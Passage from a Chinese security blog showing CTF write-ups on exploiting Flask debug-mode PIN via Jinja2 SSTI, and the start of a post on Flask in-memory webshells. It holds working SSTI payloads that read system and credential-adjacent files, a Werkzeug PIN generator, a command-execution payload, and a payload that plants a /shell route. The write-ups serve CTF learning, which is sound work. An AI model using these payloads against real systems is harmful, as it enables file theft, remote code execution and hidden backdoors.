<span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<h4 id="过滤相关"><a href="#过滤相关" class="headerlink" title="过滤相关"></a>过滤相关</h4><h5 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h5><ol>
<li>**过滤<code>self</code>**：也就是<code>/proc/self/cgroup</code>没法用了，其实其中的<code>self</code>可以用相关进程的pid去替换，这里<code>1</code>就行，也就是<code>proc/1/cgroup</code></li>
<li>**过滤<code>cgroup</code>**：可以考虑<code>mountinfo</code>或者<code>cpuset</code>，同样可以结合上面那个<code>1</code>用。一般两个都ban的时候就直接使用<code>/proc/1/cpuset</code></li>
</ol>
<h3 id="做题过程"><a href="#做题过程" class="headerlink" title="做题过程"></a>做题过程</h3><h5 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h5><p>buu上可复现</p>
<p>开题即是base64加密与解密，有hint页面，在源代码处看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- PIN ---&gt;</span><br></pre></td></tr></table></figure>

<p>所以这道题应该是考的debug模式下利用PIN码进行任意命令执行，猜测合理在base64解密的时候可以进行文件读取，这里就尝试SSTI读取。</p>
<p>稍微测试了一下，过滤popen，import与os，找到一个读文件的payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>).read()&#125;&#125;</span><br><span class="line">这个也行：</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;app.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;但是这里用的上面那个</span><br></pre></td></tr></table></figure>

<p>加密后拿去解密页面解密出现如下：<br><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515085456897.png" alt="image-20240515085456897"></p>
<p>这里就可以知道username为<code>flaskweb</code>，</p>
<p>这是可以尝试读取flask框架的网页源代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.<span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>可以读到被html编码的源代码，将其解码并正常排版后为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, render_template, request, flash, redirect, url_for</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span></span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64加密&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;提交&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm1</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64解密&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;提交&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    black_list = [<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;system&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;chr&quot;</span>, <span class="string">&quot;request&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;subprocess&quot;</span>, <span class="string">&quot;commands&quot;</span>, <span class="string">&quot;socket&quot;</span>, <span class="string">&quot;hex&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;?&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower():</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    txt = <span class="string">&quot;失败乃成功之母！！&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;hint.html&quot;</span>, txt=txt)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>):</span><br><span class="line">        text = request.values.get(<span class="string">&#x27;text&#x27;</span>)</span><br><span class="line">        text_decode = base64.b64encode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 :&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(text_decode.decode()))</span><br><span class="line">        res = render_template_string(tmp)</span><br><span class="line">        flash(tmp)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;encode&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">&quot;&quot;</span></span><br><span class="line">        form = NameForm(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, form=form, method=<span class="string">&quot;加密&quot;</span>, img=<span class="string">&quot;flask.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>):</span><br><span class="line">        text = request.values.get(<span class="string">&#x27;text&#x27;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp):</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        res = render_template_string(tmp)</span><br><span class="line">        flash(res)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">&quot;&quot;</span></span><br><span class="line">        form = NameForm1(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, form=form, method=<span class="string">&quot;解密&quot;</span>, img=<span class="string">&quot;flask1.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;name&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;404.html&quot;</span>, name=name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>可以看到黑名单以及确实可以利用ssti。</p>
<p>然后现在就是读取其他几个要素</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">随便输入报错得到/usr/local/lib/python3.7/site-packages/flask/app.py</span><br></pre></td></tr></table></figure>

<p>mac值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">然后利用</span><br><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/sys/class/net/eth0/address&quot;).read()&#125;&#125;</span><br><span class="line">得到十六进制的a2:89:2e:1f:6a:8b</span><br><span class="line">再使用如下脚本将这个替换为十进制的数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hex_string = &quot;a2:89:2e:1f:6a:8b&quot;</span><br><span class="line">cleaned_hex_string = hex_string.replace(&quot;:&quot;, &quot;&quot;)</span><br><span class="line">decimal_value = int(cleaned_hex_string, 16)</span><br><span class="line">print(decimal_value)</span><br><span class="line"></span><br><span class="line">得到178710068030091</span><br></pre></td></tr></table></figure>

<p>最后获取机器id</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同样利用这个读取</span><br><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/etc/machine-id&quot;).read()&#125;&#125;</span><br><span class="line">得到</span><br><span class="line">1408f836b0ca514d796cbf8960e45fa1</span><br></pre></td></tr></table></figure>

<p>现在都有了，直接上生成pin码的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     <span class="string">&#x27;flaskweb&#x27;</span> <span class="comment">#读/etc/passwd</span></span><br><span class="line">     <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment">#默认</span></span><br><span class="line">     <span class="string">&#x27;Flask&#x27;</span>,<span class="comment">#默认</span></span><br><span class="line">     <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span><span class="comment">#报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">     <span class="string">&#x27;178710068030091&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">   num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">          rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">          rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<p>生成<code>897-132-638</code>，</p>
<p>随后就再访问console页面并输入PIN码，如下获得flag</p>
<p><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515093557898.png" alt="image-20240515093557898"></p>
<h5 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h5><p>开题就<code>Welcome To Find Secret</code>，一番尝试后访问secret路由显示</p>
<p><code>Tell me your secret.I will encrypt it so others can&#39;t see</code></p>
<p>，尝试get请求&#x2F;secret?secret&#x3D;12324报错</p>
<p><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515113432443.png" alt="image-20240515113432443"></p>
<p>再输入secret&#x3D;1234，回显</p>
<p><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515113505672.png" alt="image-20240515113505672"></p>
<p>访问一下console路由，确实存在debug调试模式</p>
<p>现在在报错页面看看部分源码，看到如下</p>
<p><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515113700760.png" alt="image-20240515113700760"></p>
<p>应该存在ssti，看看附近代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line"> rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#解密</span></span><br><span class="line"> deS=rc.do_crypt(secret)</span><br><span class="line"> a=render_template_string(safe(deS)) </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"> <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure>

<p>这里标记了一下解密，说明这里就是解密的过程，可以发现这里是rc4解密，结合刚进入这里的提示，会解密我传入的字符串，所以应该就是我传入的字符串需要rc4加密，并且这里可以知道密钥为<code>HereIsTreasure</code>，还可以看出这里有waf。</p>
<p>先给出大佬的rc4加密脚本,<a href="https://xz.aliyun.com/t/8092?time__1311=n4+xuDgDBADQYiKP40HwbDyiDcDjr2qGIKNUQYx&alichlgref=https://www.google.com.hk/#toc-5">文章</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;res用于加密字符串，加密后是：%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密后的字符串是: %s&quot;</span> %quote(cipher))</span><br><span class="line">    <span class="comment">#print(&quot;加密后的输出(经过编码):&quot;)</span></span><br><span class="line">    <span class="comment">#print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/proc/self/cgroup&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>或者直接使用赛博厨子也行（因为有不可见字符，所以加了 urlencode）</p>
<p><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515220803321.png" alt="image-20240515220803321"></p>
<p>这里有waf，应该改过滤了base等，这道题是python2，可以利用file类直接读文件，使用代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>不知道为什么app.py读不了</p>
<p>这里就可以得到<br><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515213503173.png" alt="image-20240515213503173"></p>
<p>用户名应该为glzjin，</p>
<p>随便输得到<code>/usr/local/lib/python2.7/site-packages/flask/app.py</code></p>
<p>再使用如下语句：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/sys/class/net/eth0/address&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>分别得到<code>be:3e:db:1a:cd:fa</code>即·209177173216762·</p>
<p>再获得机器码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/proc/self/cgroup&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>但是我这里环境可能有点问题，直接看<code>/etc/machine-id</code>和<code>/proc/sys/kernel/random/boot_i</code>也没有，而<code>/proc/self/cgroup</code>又没有，没办法。</p>
<p>这里主要是为了将python2与python3对比，但这里<a href="https://xz.aliyun.com/t/8092?time__1311=n4+xuDgDBADQYiKP40HwbDyiDcDjr2qGIKNUQYx&alichlgref=https://www.google.com.hk/#toc-5">有个文章</a>是用这个方法打出来的，<strong>就是需要注意那个app.py，得到后使用时需要改为<code>app.pyc</code>。</strong></p>
<p>这道题的可直接ssti得flag的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;nl /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515223545094.png" alt="image-20240515223545094"></p>
]]></content>
      <categories>
        <category>Python漏洞</category>
        <category>debug pin码的利用</category>
      </categories>
  </entry>
  <entry>
    <title>Python内存马探究</title>
    <url>/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>比较重要，利用面挺广的</p>
<span id="more"></span>

<h1 id="Python内存马分析"><a href="#Python内存马分析" class="headerlink" title="Python内存马分析"></a>Python内存马分析</h1><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>常用的<code>Python</code>框架有<code>Django</code>、<code>Flask</code>, 这两者都可能存在<code>SSTI</code>漏洞. <code>Python内存马</code>利用<code>Flask</code>框架中<code>SSTI</code>注入来实现，<code>Flask</code>框架中在<code>web</code>应用模版渲染的过程用到**<code>render_template_string</code>**函数进行渲染, 但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现<code>Python</code>内存马的注入</p>
<h3 id="Flask-请求上下文管理机制"><a href="#Flask-请求上下文管理机制" class="headerlink" title="Flask 请求上下文管理机制"></a>Flask 请求上下文管理机制</h3><p>当网页请求进入<code>Flask</code>时，会实例化一个<code>Request Context</code>。在<code>Python</code>中分出了两种上下文：请求上下文（request context）、应用上下文（session context）。一个请求上下文中封装了请求的信息，而上下文结构是运用了一个<code>Stack</code>的栈结构，也就是说它拥有一个栈所拥有的全部特性。<code>request context</code>实例化后会被<code>push</code>到栈<code>_request_ctx_stack</code>中, 基于此特性便可以通过获取栈顶元素的方法来获取当前的请求.</p>
<h3 id="旧版Flask内存马分析"><a href="#旧版Flask内存马分析" class="headerlink" title="旧版Flask内存马分析"></a>旧版<code>Flask</code>内存马分析</h3><p>可以编写一个demo</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    person = <span class="string">&#x27;knave&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;h1&gt;Hi, %s.&lt;/h1&gt;&#x27;</span> % person</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>原始<code>Flask</code>内存马<code>Payload</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure>

<p>在成功运行后就可以在<code>/shell?cmd=ls</code>执行命令。</p>
<p><strong>注意：如果想在其他地方利用就需要加上<code>render_template_string()函数</code>，就是将payload改成符合格式后包含到这个函数当中。</strong>比如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=render_template_string(<span class="string">&quot;&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())\&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">同时结合下面的payload的分析，直接<span class="built_in">eval</span>(<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;,&#x27;shell&#x27;,lambda:__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read())&quot;</span>)也行</span><br></pre></td></tr></table></figure>

<p><strong>局限：</strong></p>
<p>在现在新版<code>Flask</code>使用这个payload会出现以下问题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AssertionError: The setup method &#x27;add_url_rule&#x27; can no longer be called on the application. It has already handled its first request, any changes will not be applied consistently.</span><br><span class="line">Make sure all imports, decorators, functions, etc. needed to set up the application are done before running it.</span><br></pre></td></tr></table></figure>

<p>这说明新版<code>Flask</code>无法再在应用程序上调用安装方法<code>&quot;add_url_rule&quot;</code>，所以应该是用不了这个方法的，下面了解一下思想即可，但遇到题的时候还是可以先试试这个方法。</p>
<h4 id="Payload分析"><a href="#Payload分析" class="headerlink" title="Payload分析"></a>Payload分析</h4><p>将payload拆分开，逐层分析</p>
